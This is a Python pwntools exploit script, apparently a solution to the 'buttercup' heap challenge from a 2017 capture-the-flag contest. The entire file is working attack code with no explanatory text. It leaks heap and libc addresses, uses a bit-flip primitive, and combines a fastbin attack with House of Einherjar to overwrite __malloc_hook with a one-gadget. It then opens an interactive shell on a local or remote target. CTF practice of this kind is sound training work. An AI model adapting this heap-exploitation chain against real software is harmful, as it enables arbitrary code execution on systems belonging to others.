#!/usr/bin/env python

from pwn import *
import sys

def addNote(size, idx):
    r.sendlineafter(">>", "1")
    r.sendlineafter("input",str(size))
    r.sendlineafter("index",str(idx))

def deleteNote(idx):
    r.sendlineafter(">>", "2")
    r.sendlineafter("index",str(idx)) 

def editNote(idx, content):
    r.sendlineafter(">>", "3")
    r.sendlineafter("index",str(idx))
    r.send(content)

def view():
    r.sendlineafter(">>", "4")
    return r.recvuntil("1)")
def changeAuthor():
    r.sendlineafter(">>", "5")

def exit():
    r.sendlineafter(">>", "6")

def flip(addr):
    r.sendlineafter(">>", "1337")
    r.sendlineafter("Address :", str(addr))

def exploit(r):
    ## LEAK LIBC + HEAP
    addNote(200, 0)
    addNote(200, 1)
    addNote(200, 2)
    addNote(200, 3)
    deleteNote(0)
    deleteNote(2)
    addNote(200,0)
    addNote(200,2)
    
    editNote(0,"A"*0x7+"Z") 
    leak = view()
    heap_base = u64(leak.split("AZ")[1][0:6].ljust(8,'\0'))-0x2a0
    libc_base = u64(leak.split("2 => ")[1][0:6].ljust(8,'\0'))-0x3c4b78

    log.success("heap_base: "+hex(heap_base))
    log.success("libc_base: "+hex(libc_base))

    target_chunk = heap_base+0x5d8
    malloc_hook = libc_base+0x3c4b10
    one_shot = libc_base+0xf0274
    ## FASTBIN ATTACK + HOUSE OF EINHERJAR
    addNote(0x80, 4)
    addNote(0x68, 5)
    addNote(0x88, 6)
    addNote(245, 7)

    payload  = "A"*8
    payload += p64(0x180)
    payload += p64(heap_base+0x450)
    payload += p64(heap_base+0x450)
    editNote(4,payload)    

    payload  = "A"*0x80
    payload += p64(0x180)
    editNote(6, payload)

    flip(target_chunk)
    deleteNote(7)

    deleteNote(5)
    
    payload = "Z"*15*8
    payload += p64(0x71)
    payload += p64(malloc_hook-0x30+0xd) 
    addNote(200, 8)
    editNote(8,payload)

    payload = "H"*0x13+p64(one_shot)
    addNote(0x68,5)
    addNote(0x68,7)
    editNote(7,payload)
    deleteNote(6)
    r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['/home/vagrant/CTFs/inctf17/buttercup/buttercup'], env={"LD_PRELOAD":"./libc.so.6"})
        #r = process(['/home/vagrant/CTFs/inctf17/buttercup/buttercup'], env={"LD_PRELOAD":""})
        print util.proc.pidof(r)
        pause()
        exploit(r)
